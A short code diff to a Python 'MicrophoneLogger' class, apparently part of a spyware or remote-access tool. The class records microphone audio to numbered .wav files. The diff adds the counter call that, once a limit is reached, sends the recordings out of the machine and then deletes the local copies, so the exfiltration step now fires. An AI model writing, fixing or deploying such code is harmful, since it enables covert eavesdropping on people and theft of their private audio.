@@ -26,11 +26,12 @@ class MicrophoneLogger:
             os.path.join(self.log_directory_path, f"{self.counter}.wav"), 44100, recording
         )
         log_info(f"Logged microphone recording to {os.path.join(self.log_directory_path, f'{self.counter}.wav')}")
+        self.increment_and_check_counter()
 
     def increment_and_check_counter(self):
         self.counter += 1
-        if self.counter > self.counter_max:
-            send_log_files_in_directory(f"SENDING LOG FILES IN DIRECTORY: {self.log_directory}", self.log_directory)
+        if self.counter >= self.counter_max:
+            send_log_files_in_directory("`Sending microphone logs...`", self.log_directory)
             clear_files_in_log_directory(self.log_directory)
             log_info("Sent and cleared microphone log files.")
             self.counter = 0
